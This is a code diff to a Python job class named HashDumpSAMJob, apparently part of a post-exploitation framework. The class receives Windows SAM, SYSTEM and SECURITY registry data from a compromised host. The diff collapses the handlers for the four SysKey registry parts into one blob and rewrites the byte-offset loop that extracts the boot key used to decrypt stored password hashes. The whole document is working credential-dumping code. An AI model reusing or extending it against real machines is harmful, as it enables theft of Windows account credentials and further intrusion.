@@ -38,39 +38,18 @@ class HashDumpSAMJob(core.job.Job):
             self.sam_data = data
             return
 
-        if task == "SYSTEM":
+        # if task == "SYSTEM":
+        #     handler.reply(200)
+
+        #     self.print_status("received SYSTEM hive (%d bytes)" % len(data))
+        #     self.system_data = data
+        #     return
+
+        if task == "SysKey":
             handler.reply(200)
 
-            self.print_status("received SYSTEM hive (%d bytes)" % len(data))
-            self.system_data = data
-            return
-
-        if task == "SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD":
-            handler.reply(200)
-
-            self.print_status("received SysKey part 1 (%d bytes)" % len(data))
-            self.system_jd = data
-            return
-
-        if task == "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1":
-            handler.reply(200)
-
-            self.print_status("received SysKey part 2 (%d bytes)" % len(data))
-            self.system_skew1 = data
-            return
-
-        if task == "SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG":
-            handler.reply(200)
-
-            self.print_status("received SysKey part 3 (%d bytes)" % len(data))
-            self.system_gbg = data
-            return
-
-        if task == "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data":
-            handler.reply(200)
-
-            self.print_status("received SysKey part 4 (%d bytes)" % len(data))
-            self.system_data = data
+            self.print_status("received SysKey (%d bytes)" % len(data))
+            self.syskey_data = data
             return
 
         if task == "SECURITY":
@@ -106,21 +85,20 @@ class HashDumpSAMJob(core.job.Job):
 
         # self.system_file = self.save_file(self.system_data)
         # self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
-        self.system_jd_file = self.save_file(self.system_jd)
-        self.system_skew1_file = self.save_file(self.system_skew1)
-        self.system_gbg_file = self.save_file(self.system_gbg)
-        self.system_data_file = self.save_file(self.system_data)
+        self.syskey_data_file = self.save_file(self.syskey_data)
 
         tmp_syskey = ""
         self.syskey = ""
-        for f in [self.system_jd_file, self.system_skew1_file, self.system_gbg_file, self.system_data_file]:
-            with open(f, 'rb') as sysfile:
-                file_contents = sysfile.read()
+        with open(self.syskey_data_file, 'rb') as syskeyfile:
+            file_contents = syskeyfile.read()
 
-            i = 4220
-            while i < 4235:
+        i = 4220
+        while i < 28811:
+            j = i + 15
+            while i < j:
                 tmp_syskey += file_contents[i:i+1].decode()
                 i += 2
+            i += 8176
 
         tmp_syskey = list(map(''.join, zip(*[iter(tmp_syskey)]*2)))
 
